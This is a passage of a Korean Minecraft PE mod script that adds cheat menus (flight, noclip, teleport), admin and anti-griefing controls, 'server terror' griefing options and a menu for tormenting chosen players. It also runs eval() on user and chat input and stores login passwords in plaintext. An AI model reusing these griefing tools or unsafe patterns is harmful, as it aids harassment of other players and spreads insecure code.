webSet.setBuiltInZoomControls(wvsa[2]);
webSet.setSaveFormData(wvsa[3]);
webSet.setSavePassword(wvsa[4]);
web.setWebChromeClient(new android.webkit.WebChromeClient());
web.setWebViewClient(new android.webkit.WebViewClient());
if(Dark.read("hp")==""){
Dark.toast("홈페이지를 먼저 설정해 주세요.");
return;
}
web.loadUrl("http://"+Dark.read("hp"));
layout2.addView(web);
var exit = makeButton("뒤로/나가기");
exit.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
if(web.canGoBack()){
web.goBack();
}
else{
if(menu!=null){
menu.dismiss();
menu = null;
}
}
}
});
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout2);
layout.addView(scroll);
menu.setContentView(layout);
menu.setFocusable(true);
if(wvsa[0]){
menu.setWidth(ctx.getWindowManager().getDefaultDisplay().getWidth());
menu.setHeight(ctx.getWindowManager().getDefaultDisplay().getHeight());
}
else{
menu.setWidth(ctx.getWindowManager().getDefaultDisplay().getWidth()*2/3);
menu.setHeight(ctx.getWindowManager().getDefaultDisplay().getHeight()*3/4);
}
menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(70, 0, 0, 0)));
menu.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function setHome(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc2 = new android.widget.EditText(ctx);
loc2.setHint("'http://'를 제외한주소를 입력하세요...");
if(Dark.read("hp")!="") loc2.setText(Dark.read("hp")+"");
layout.addView(loc2);
Dark.noFullScreen(loc2);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle("홈페이지 설정");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
Dark.save("hp", loc2.getText().toString());
Dark.toast("홈페이지가 'http://"+loc2.getText()+"'로 설정되었습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function moveSet(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuM = new android.widget.PopupWindow();
var title = makeTitle("이동 계열", menuM);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var btnT = [];
var menusT = ["공중부양", "블록 통과", "R/W & Zoom", "자동 걷기", "매직 카펫", "제트팩", "벽타기", "숙이기", "Smart Moving", "낙뎀 방지", "점프 강화"];
var bools = [Player.canFly(), pass, Boolean(btnR), walk, Boolean(mcBtn), j.on, climbing, sneak, Boolean(s.btn), nf.tf, jump];
for(var n in menusT){
btnT[n] = new DarkToggleButton(ctx);
btnT[n].setText(menusT[n]);
btnT[n].setId(n);
btnT[n].setChecked(bools[n]);
btnT[n].setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
switch(toggle.getId()){
case 0 : 
Player.setCanFly(onoff);
break;
case 1 : 
try{
if(onoff==true){
Entity.setCollisionSize(Player.getEntity(), -1, -1);
pass = true;
}
else if(onoff==false){
Entity.setCollisionSize(Player.getEntity(), 0.7, 1.8);
pass = false;
}
}
catch(e){
Dark.toast(e);
}
break;
case 2 : 
if(onoff){
makeTwoBtn();
}
else{
if(btnR!=null){
btnR.dismiss();
btnR = null;
}
if(btnF!=null){
btnF.dismiss();
btnF = null;
}
ModPE.resetFov();
run = false;
}
break;
case 3 : 
walk = onoff;
break;
case 4 : 
makeMcBtn(onoff);
break;
case 5 : 
if(onoff){
openFlying();
j.on = true;
}
else{
if(menuJ!=null){
menuJ.dismiss();
menuJ = null;
}
j.on = false;
}
break;
case 6 : 
climbing = onoff;
if(onoff) Dark.toast("벽타기 활성화");
else Dark.toast("벽타기 비활성화");
break;
case 7 : 
sneak = onoff;
Entity.setSneaking(Player.getEntity(), onoff);
break;
case 8 : 
smartMoving(onoff);
break;
case 9 : 
nf.tf = onoff;
break;
case 10 : 
jump = onoff;
break;
}
}
}));
layout.addView(btnT[n].mv());
}
var btns = [];
var menus = ["이동 방식 선택", "시계 지급", "좌표 기억/이동", "바라보는 곳으로 tp", "이동계 도움말", "Hyper Movement"];
for(var n in menus){
btns[n] = makeButton(menus[n]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
switch(v.getId()){
case 0 : 
clockMoving();
break;
case 1 : 
addItemInventory(347, 1, 0);
Dark.toast("시계가 지급되었습니다.");
break;
case 2 : 
if(atp==0){
Dark.toast("도착 지점을 선택(터치)하세요.");
atp = 1;
}
else if(atp==2){
Dark.toast("터치하시면 이동됩니다.");
atp = 3;
}
break;
case 3 : 
if(ctp==false){
makeCross(true);
ctp = true;
Dark.toast("터치하시면 이동합니다.");
}
break;
case 4 : 
Dark.showDialog("이동 계열 도움말", "벽타기 모드가 켜져있으면, 블록 한 칸은 올라갈 수 없습니다.\n\"이동 방식 선택\"은 시계로 터치했을 때, 어떻게 이동할지 선택하는 부분입니다.\n\n<제트팩 버튼 설명>\nS - 공중 체류\nF - 바라보는 방향으로 비행\nf/b - 비행 방향 설정(앞/뒤)\n\n<스마트 무빙 버튼 설명>\n왼쪽 버튼\nrun/walk - 달리기/걷기\nA.W. - 자동 걷기\n\n오른쪽 버튼\nB - 숙이기\nC - 벽타기\nG - 매달리기\nJ - 슈퍼 점프\nL - 엎드리기(?)\n");
break;
case 5 : 
ScriptManager.callScriptMethod("hyperMovementRequestHook", []);
break;
}
}
});
layout.addView(btns[n]);
}
var exit = makeExit(menuM);
if(useExitBtn!=2) layout.addView(exit);
var layout2 = new android.widget.LinearLayout(ctx);
var scroll = makeScroll(layout, layout2, menuM);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuM.setContentView(layout2);
menuM.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function inputText(type){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var loc2 = new android.widget.EditText(ctx);
switch(type){
case 0 : 
loc2.setHint("실행할 함수를 입력하세요...");
dialog.setTitle("함수 실행");
break;
case 1 : 
loc2.setHint("이름을 입력하세요...");
dialog.setTitle("엔티티 이름 짓기");
break;
case 2 : 
loc2.setHint("지도 범위를 입력하세요...");
dialog.setTitle("지도 범위 설정");
break;
case 4 : 
loc2.setHint("불에 탈 시간(초)을 입력하세요...");
dialog.setTitle("불붙이기");
break;
case 5 : 
loc2.setHint("명령어를 입력하세요...");
dialog.setTitle("명령어 입력");
break;
}
layout.addView(loc2);
Dark.noFullScreen(loc2);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
switch(type){
case 0 : 
eval(loc2.getText()+"");
break;
case 1 : 
entName = loc2.getText()+"";
Dark.toast("이름을 부여할 엔티티를 터치하세요.");
break;
case 2 : 
Dark.save("map", loc2.getText().toString());
break;
case 4 : 
Entity.setFireTicks(playerTarget, loc2.getText());
Dark.toast(Player.getName(playerTarget)+"(을)를 "+loc2.getText()+"초 동안 태웁니다.");
if(pca) darkMessage(Player.getName(playerTarget)+"(을)를 "+loc2.getText()+"초 동안 태웁니다.");
break;
case 5 : 
procCmd(loc2.getText().toString());
break;
}
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function chatHook(str){
if(str.substr(0, 5)==".run "){
darkProcCmd(str.substring(5, str.length));
preventDefault();
}
if(compileFinish){
var s = str;
eval(dcmsData.chatHook+"");
}
eval(astel.ch+"");

}


function darkLiber(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuDL = new android.widget.PopupWindow();
var title = makeTitle("D.L. Skill", menuDL);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var esps = [];
for(var n in espNames){
esps[n] = new android.widget.Switch(ctx);
esps[n].setText(espNames[n]);
if(dl.esp[n]==null)
esps[n].setChecked(false);
else
esps[n].setChecked(true);
esps[n].setId(n);
esps[n].setTextColor(white2);
esps[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(swit, onoff){
if(onoff==true){
espOn(swit.getId());
}
else if(onoff==false){
dl.esp[swit.getId()] = null;
Dark.toast(espNames[swit.getId()]+" 비활성화");
}
}
}));
layout.addView(esps[n]);
}
var ar = new DarkToggleButton(ctx);
var mexp = new DarkToggleButton(ctx);
ar.setText("자동 수복/삭제");
mexp.setText("서버장 폭발 데미지");
ar.setChecked(auto);
mexp.setChecked(exp.onoff);
ar.setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
if(onoff==true){
auto = true;
Dark.toast("자동수복&자동삭제 활성화");
}
else if(onoff==false){
auto = false;
Dark.toast("자동수복&자동삭제 비활성화");
}
}
}));
mexp.setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
exp.onoff = onoff;
}
}));
layout.addView(ar.mv());
layout.addView(mexp.mv());
var al = makeButton("안티렉 리셋");
var reset = makeButton("모든 능력 리셋");
var help = makeButton("도움말");
al.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
anti = 0;
Dark.toast("리셋되었습니다.");
}
});
reset.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
for(var n in espNames){
dl.esp[n] = null;
esps[n].setChecked(false);
}
Dark.toast("모든 능력이 비활성화 되었습니다.");
}
});
help.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
Dark.showDialog("D.L. Skill 도움말", "D.L. Skill는 Dark Tornado와 Liber de Obscurum이 공동개발중이라는 설정의 스킬들입니다. Dark Tornado와 Liber de Obscurum이 만들어놓은 스킬들 중 원하는 스킬을 부여받아서 사용한다는 설정입니다.(걍 능력자 스크립트임.)\n스킬은 다크 치터로만 부여가 가능하며, 금괴로 바닥이나 상대방을 터치하면 해당 스킬이 발동됩니다. 쿨타임은 모두 30초 입니다(정확히는 22.5초).\n\n<용어 설명>\n자동 수복 : 스킬 사용으로 인한 지형 파괴를 일정 시간이 지나면 자동으로 수복. 평지맵이 기준임.\n자동 삭제 : 스킬 사용으로 인해 생기는 블록들을 일정 시간이 지나면 자동으로 삭제. 대부분 평지맵이 기준임.\n안티 렉 : 폭발계 스킬 사용 시 발생하는 드롭된 아이템의 생성을 막음으로서 렉을 줄이는 기술\n\n<스킬 목록>\nFire Summon - 3×3+4로 불 소환\nWater Bind - 안쪽으로 흐르는 물을 5×5로 소환\nMono Tree - 나무 소환. 주변 적들 체력 감소.\nSand Burst - 모래를 3×3×3으로 소환. 3초 뒤 폭발.\nUndead Summon - 좀비와 스켈레톤을 각각 3마리 씩 소환\nPush - 타격시 상대방을 뒤로 밀침.\nBurst - 터치한 방향에서 폭발.\nAbsorb - 타격시 상대방 체력 흡수.\nLight Burster - 바라보는 방향으로 빛 발사\nDark Burster - 바라보는 방향으로 어둠 발사\n");
}
});
layout.addView(al);
layout.addView(reset);
layout.addView(help);
var exit = makeExit(menuDL);
if(useExitBtn!=2) layout.addView(exit);
var layout2 = new android.widget.LinearLayout(ctx);
var scroll = makeScroll(layout, layout2, menuDL);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuDL.setContentView(layout2);
menuDL.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function espOn(nn){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var player;
var players = [];
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
players.push(e);
}
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var radios = new android.widget.RadioGroup(ctx);
radios.setOrientation(1);
var radio = [];
for(var n in players){
radio[n] = new android.widget.RadioButton(ctx);
radio[n].setText(Player.getName(players[n]));
radio[n].setId(n);
radio[n].setTextColor(white);
radios.addView(radio[n]);
}
radios.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
player = players[checkedId];
}
}));
layout.addView(radios);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setTitle(espNames[nn]+" on");
dialog.setNegativeButton("취소", null);
dialog.setPositiveButton("확인", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
dl.esp[nn] = player;
Dark.toast(espNames[nn]+" on");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
Dark.toast("플레이어를 선택하세요.");
}


function antiTerrorSet(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuT = new android.widget.PopupWindow();
var title = makeTitle("테러 방지 옵션", menuT);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var menus = ["TNT 생성 방지", "폭발 삭제", "PVE 방지", "모든 창고 잠금", "물 방지", "용암 방지", "불 방지", "TNT 설치 방지", "거미줄 방지", "베드락 방지", "투명 베드락 방지", "옵시디언 방지", "빛나는 옵시디언 방지", "광역 파괴 자동 킥", "인첸트 자동 킥", "포션 효과 방지", "도배 자동 킥", "발사기 방지", "위더 스폰 방지", "엔더 크리스탈 방지"];
var checkBox = [];
for(var n in menus){
checkBox[n] = new android.widget.CheckBox(ctx);
checkBox[n].setText(menus[n]);
checkBox[n].setId(n);
checkBox[n].setTextColor(white2);
checkBox[n].setChecked(antiTerror[n]);
checkBox[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
antiTerror[check.getId()] = onoff;
}
}));
layout.addView(checkBox[n]);
}
var ta = new DarkToggleButton(ctx);
var at = new DarkToggleButton(ctx);
ta.setText("테러 알림 on");
at.setText("서버장 포함");
ta.setChecked(terrorAlert);
at.setChecked(adTer);
ta.setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
terrorAlert = onoff;
}
}));
at.setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
adTer = onoff;
}
}));
layout.addView(ta.mv());
layout.addView(at.mv());
var btns = [];
var menus = ["전체 선택", "전체 해제", "블록 파괴 방지", "테러 기록 보기/초기화", "신고된 테러범 목록"];
for(var n in menus){
btns[n] = makeButton(menus[n]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
switch(v.getId()){
case 0 : 
for(var n in checkBox)
checkBox[n].setChecked(true);
break;
case 1 : 
for(var n in checkBox)
checkBox[n].setChecked(false);
break;
case 2 : 
openMineDialog();
break;
case 3 : 
showTerrorLog();
Dark.toast("창고 터치, 폭발 삭제, TNT, 엔더 크리스탈 생성 방지, 위더/크리퍼 스폰 방지는 포함되지 않습니다.");
break;
case 4 : 
if(checkInternet()){
Dark.toast("테러범 목록을 불러오고 있습니다...");
new java.lang.Thread({
run : function(){
Dark.showDialog("신고된 테러범 목록", String(Dark.getDataFromServer(GitHubLink+"terrorList.txt")));
}
}).start();
}
else{
Dark.toast("인터넷 연결을 확인하여 주세요.");
}
break;
}
}
});
btns[n].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
switch(v.getId()){
case 3 : 
terrorLog = "";
Dark.toast("테러 기록이 초기화 되었습니다.");
break;
case 4 : 
new java.lang.Thread({
run : function(){
if(Dark.checkPermission("report")){
inputTerrorlistName();
Dark.toast("허위 신고 시, 제작자에게 싸대기를 맞을 수 있습니다.");
}
else{
Dark.toast("지금은 제작자 측에서 신고를 접수하지 않습니다.");
}
}
}).start();
break;
}
return true;
}
});
layout.addView(btns[n]);
}
var exit = makeExit(menuT);
if(useExitBtn!=2) layout.addView(exit);
var layout2 = new android.widget.LinearLayout(ctx);
var scroll = makeScroll(layout, layout2, menuT);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuT.setContentView(layout2);
menuT.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function showItems(type){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var web = new android.webkit.WebView(ctx);
web.setWebChromeClient(new android.webkit.WebChromeClient());
web.setWebViewClient(new android.webkit.WebViewClient());
switch(type){
case 0 : 
dialog.setTitle("아이템 아이디");
web.loadUrl("http://hydra-media.cursecdn.com/minecraft.gamepedia.com/c/c6/DataValuesPE.png");
break;
case 1 : 
dialog.setTitle("아이템 아이디 (PC)");
web.loadUrl(GitHubLink+"pcItems.jpg");
break;
case 2 : 
dialog.setTitle("포션 조합법");
web.loadUrl(GitHubLink+"potionRecipe.jpeg");
break;
}
layout.addView(web);
var pad = dip2px(ctx, 5);
layout.setPadding(pad, pad, pad, pad);
var scroll = new android.widget.ScrollView(ctx);
scroll.addView(layout);
dialog.setView(scroll);
dialog.setNegativeButton("닫기", null);
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function terrorHelper(tf){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
if(tf){
if(Dark.read("terrorHelper")==""){
Dark.toast("추가 파일이 필요합니다.\n고급 테러를 비활성화 합니다.");
terPass = false;
}
else{
eval(Dark.read("terrorHelper"));
}
}
else{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var menus = ["라이터 지급", "TNT 지급", "물 양동이 지급", "용암 양동이 지급", "거미줄 지급", "베드락 지급", "고급 테러"];
dialog.setItems(menus, new android.content.DialogInterface.OnClickListener({
onClick : function(m, w){
if(w==0) addItemInventory(259, 1, 0);
else if(w==1) addItemInventory(46, 10, 0);
else if(w==2) addItemInventory(325, 1, 8);
else if(w==3) addItemInventory(325, 1, 10);
else if(w==4) addItemInventory(30, 10, 0);
else if(w==5) addItemInventory(7, 10, 0);
else if(w==6) advancedTerrorRequest();
}
}));
dialog.setTitle("테러 도우미");
dialog.setNegativeButton("취소", null);
dialog.show();
}
}
catch(e){
Dark.showError(e);
}
}
}));
}


function advancedTerrorRequest(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function() {
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
dialog.setTitle("고급 테러 활성화");
dialog.setMessage("고급 테러를 사용하시겠습니까?");
dialog.setNegativeButton("아니요", null);
dialog.setPositiveButton("네", new android.content.DialogInterface.OnClickListener({
onClick : function(v){
terPass = true;
Dark.toast("고급 테러가 활성화되었습니다.");
}
}));
dialog.show();
}
catch(e){
Dark.showError(e);
}
}
}));
}


function makeScreen(){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var menu = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOnTouchListener(new android.view.View.OnTouchListener({
onTouch : function(v, ev){
if(ev.getAction()==android.view.MotionEvent.ACTION_DOWN){
Dark.save("btnX", ev.getRawX());
Dark.save("btnY", ev.getRawY());
if(btn!=null){
btn.dismiss();
btn = null;
}
Dark.makeButton();
Dark.toast("수정되었습니다.");
menu.dismiss();
}
return true;
}
}));
menu.setContentView(layout);
menu.setWidth(ctx.getWindowManager().getDefaultDisplay().getWidth());
menu.setHeight(ctx.getWindowManager().getDefaultDisplay().getHeight());
menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(120, 0, 0, 0)));
menu.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function chatReceiveHook(str, s){
var Data = str.split(" ");
if(opCheck(s)) procCmdOp(s, str);
if(wo.tf&&wo.user.indexOf(s)!=-1) procCmdWE(s, str);
chatLog += "<"+s+"> "+str+"\n";
if(antiChat){
if(antiChatData.indexOf(s)!=-1){
preventDefault();
}
else{
new java.lang.Thread({
run : function(){
antiChatData.push(s);
java.lang.Thread.sleep(1000);
antiChatData.splice(antiChatData.indexOf(s), 1);
}
}).start();
}
}
if(chatIgnore.indexOf(s)!=-1) preventDefault();
if(hyperLogOn) hyperLog += "["+Dark.getTime(2)+"] "+s+"(이)가 \""+str+"\"(이)라고 채팅함.\n";
if(useLogin){
if(notLoginArray[0]!=null&&Data[0]==".로그인"){
for(var n=0;n<notLoginArray.length;n++){
if(s==Player.getName(notLoginArray[n])){
var list = Dark.read("login").toString().split("\n");
var isLogin = false;
for(var m in list){
var data = list[m].split("::");
if(Data[1]==data[1]){
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(100);
Dark.clearChat();
darkMessage("로그인 되었습니다. 환영합니다, "+s+"님.", true);
}
}).start();
notLoginArray.splice(n, 1);
posData.splice(n, 1);
isLogin = true;
break;
}
}
if(!isLogin){
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(100);
Dark.clearChat();
darkMessage("비밀번호가 다릅니다. 다시 시도하여 주세요.", true);
}
}).start();
}
break;
}
}

}  
if(notRigisterArray[0]!=null&&Data[0]==".가입"){
for(var n=0;n<notRigisterArray.length;n++){
if(s==Player.getName(notRigisterArray[n])){
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(100);
Dark.clearChat();
darkMessage("회원가입 및 로그인 되었습니다. 환영합니다, "+s+"님.", true);
}
}).start();
notRigisterArray.splice(n, 1);
posData.splice(n, 1);
Dark.save("login", Dark.read("login")+s+"::"+Data[1]+"\n");
break;
}
}
}
}
if(antiTerror[16]){
if(chatKick.indexOf(s)!=-1){
var pe = findHuman(s);
darkMessage(s+"의 채팅방 도배가 감지되어, 자동으로 강퇴합니다.", true);
terrorLog += s+" : 채팅창 도배\n";
Entity.remove(pe);
}
else{
chatKick.push(s);
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(1000);
chatKick.splice(chatKick.indexOf(s), 1);
}
}).start();
}
}
eval(astel.crh+"");
if(nameChat){
var delay;
if(str.length<10) delay = 2500;
else if(str.length<30) delay = 5000;
else delay = 7000;
var target = findHuman(s);
var cache = Player.getName(target);
Entity.setNameTag(target, cache+"\n"+str);
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(delay);
Entity.setNameTag(target, cache);
}
}).start();
}

}


function opCheck(name){
for(var n in ops){
if(Player.getName(ops[n])==name)
return true;
}
return false;
}


function findHuman(name){
for each(var e in Entity.getAll()){
if(Player.getName(e)==name)
return e;
}
}


function getDistanceFromAdmin(x, y, z){
var px, py, pz, dist;
px = x-Entity.getX(ad);
py = y-Entity.getY(ad);
pz = z-Entity.getZ(ad);
dist = Math.sqrt(Math.pow(px, 2)+Math.pow(py, 2)+Math.pow(pz, 2));
return dist;
}


function terrorSet(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuT3 = new android.widget.PopupWindow();
var title = makeTitle("서버 테러", menuT3);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var radios = new android.widget.RadioGroup(ctx);
var menus = ["비활성화", "TNT 설치", "구멍 생성", "폭발", "메테오", "불", "번개"];
var radio = [];
for(var n in menus){
radio[n] = new android.widget.RadioButton(ctx);
radio[n].setText(menus[n]);
radio[n].setTextColor(white2);
radio[n].setId(n);
radios.addView(radio[n]);
}
radios.setOnCheckedChangeListener(new android.widget.RadioGroup.OnCheckedChangeListener({
onCheckedChanged: function (group, checkedId){
mapTerror = checkedId;
}
}));
layout.addView(radios);
var mem = new DarkToggleButton(ctx);
mem.setText("서버원 포함");
mem.setChecked(mapTerror2);
mem.setOnChangedListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(toggle, onoff){
mapTerror2 = onoff;
}
}));
layout.addView(mem.mv());
var exit = makeExit(menuT3);
if(useExitBtn!=2) layout.addView(exit);
var layout2 = new android.widget.LinearLayout(ctx);
var scroll = makeScroll(layout, layout2, menuT3);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuT3.setContentView(layout2);
menuT3.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function startDestroyBlock(x, y, z){
if(Level.getGameMode()==0&&instaBreak){
Level.destroyBlock(x, y, z, true);
preventDefault();
if(gh[3]) destroyBlock(x, y, z);
}
if(mfmf[2]){
new java.lang.Thread({
run : function(){
while(mfmf[2]){
java.lang.Thread.sleep(500);
if([257, 270, 274, 278, 285].indexOf(getCarriedItem())!=-1) Level.destroyBlock(x, y, z);
else mfmf[2] = false;
}
}
}).start();
}


}


function destroyBlock(x, y, z, s){
if(Level.getGameMode()==0&&gh[3]){
Level.dropItem(x, y, z, 0, getTile(x, y, z), 63, Level.getData(x, y, z));
Level.destroyBlock(x, y, z, true);
preventDefault();
}
if(mfmf[1]){
if(Dark.isMulti()){
Dark.toast("타인의 서버에서는 사용할 수 없습니다.");
}
else{
for(var xx=x-2;xx<x+3;xx++)
for(var yy=y-3;yy<y+4;yy++)
for(var zz=z-2;zz<z+3;zz++)
if(getTile(xx, yy, zz)!=0){
Level.destroyBlock(xx, yy, zz);
}
}
}

}


function checkInternet(){
try{
var cm = ctx.getSystemService(android.content.Context.CONNECTIVITY_SERVICE);
var mobile = cm.getNetworkInfo(cm.TYPE_MOBILE);
var wifi = cm.getNetworkInfo(cm.TYPE_WIFI);
if(mobile.isConnected()||wifi.isConnected()){
return true;
}
else{
return false;
}
}
catch(e){
try{
if(wifi.isConnected()){
return true;
}
}
catch(err){
Dak.toast(err);
}
}
}


function playersSet(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
menuP2 = new android.widget.PopupWindow();
var title = makeTitle("플레이어들 관리", menuP2);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var players = [];
var playerTargets = [];
for each(var e in Entity.getAll()){
if(Player.isPlayer(e))
players.push(e);
}
if(antiTwo){
var players2 = removeDouble(players);
players = players2;
}
if(playerSort){
players.sort();
}
var checks = [];
for(var n in players){
checks[n] = new android.widget.CheckBox(ctx);
if(showPlayerHealth){
var pn = Player.getName(players[n]).split(" (");
checks[n].setText(pn[0]+"("+Entity.getHealth(players[n])+")");
}
else{
checks[n].setText(Player.getName(players[n])+"("+Entity.getHealth(players[n])+")");
}
checks[n].setId(n);
checks[n].setTextColor(white2);
checks[n].setOnCheckedChangeListener(new android.widget.CompoundButton.OnCheckedChangeListener({
onCheckedChanged : function(check, onoff){
if(onoff==true){
playerTargets.push(players[check.getId()]);
}
else if(onoff==false){
playerTargets.splice(playerTargets.indexOf(players[check.getId()]), 1);
}
}
}));
layout.addView(checks[n]);
}
var all = makeButton("모두 선택");
var reset =makeButton("모두 해제");
all.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
for(var n in players){
if(!checks[n].isChecked())
checks[n].setChecked(true);
}
}
});
reset.setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
for(var n in players){
if(checks[n].isChecked())
checks[n].setChecked(false);
}
}
});
layout.addView(all);
layout.addView(reset);
var btns = [];
var menus = ["체력설정", "소환", "전송", "추방", "아이템 지급", "포션 효과 부여/삭제", "조지기", "칭호 부여"];
for(var n in menus){
btns[n] = makeButton(menus[n]);
btns[n].setId(n);
btns[n].setOnClickListener(new android.view.View.OnClickListener(){
onClick : function(v){
switch(v.getId()){
case 0 : 
playerHealth(playerTargets);
break;
case 1 : 
for each(var pp in playerTargets)
teleport(pp, Entity.getX(ad), Entity.getY(ad)+1, Entity.getZ(ad));
break;
case 2 : 
playerTp(playerTargets);
break;
case 3 : 
for each(var pp in playerTargets)
Entity.remove(pp);
break;
case 4 : 
addItem(true, playerTargets);
break;
case 5 : 
giveEffectType(playerTargets, true);
break;
case 6 : 
fuckYouPlayer(playerTargets);
break;
case 7 : 
inputTitle(playerTargets);
break;
}
}
});
btns[n].setOnLongClickListener(new android.view.View.OnLongClickListener(){
onLongClick: function(v){
try{
switch(v.getId()){
case 0 : 
inputMaxHealth(playerTargets);
break;
case 5 : 
removeEffectType(playerTargets);
break;
case 7 : 
for each(var pp in playerTargets){
var pn = Player.getName(pp).toString().split("] §f");
if(pn[1]!=null) Entity.setNameTag(pp, pn[1]);
}
Dark.toast("칭호를 삭제하였습니다.");
break;
}
}
catch(e){
dtm(e);
}
return true;
}
});
layout.addView(btns[n]);
}
var exit = makeExit(menuP2);
if(useExitBtn!=2) layout.addView(exit);
var layout2 = new android.widget.LinearLayout(ctx);
var scroll = makeScroll(layout, layout2, menuP2);
layout2.setOrientation(1);
layout2.addView(title);
layout2.addView(scroll);
menuP2.setContentView(layout2);
menuP2.showAtLocation(ctx.getWindow().getDecorView(), center, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
}


function fuckYouPlayer(arr){
ctx.runOnUiThread(new java.lang.Runnable({
run: function(){
try{
var dialog = new android.app.AlertDialog.Builder(ctx, holoDark);
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
var types = ["독 효과", "멀미", "구속", "체력 1", "불붙이기", "거미줄", "생매장", "실명", "위로 tp", "벼락 떨구기"];
var fucks = [false, false, false, false, false, false, false, false, false, false];
var checks = [];
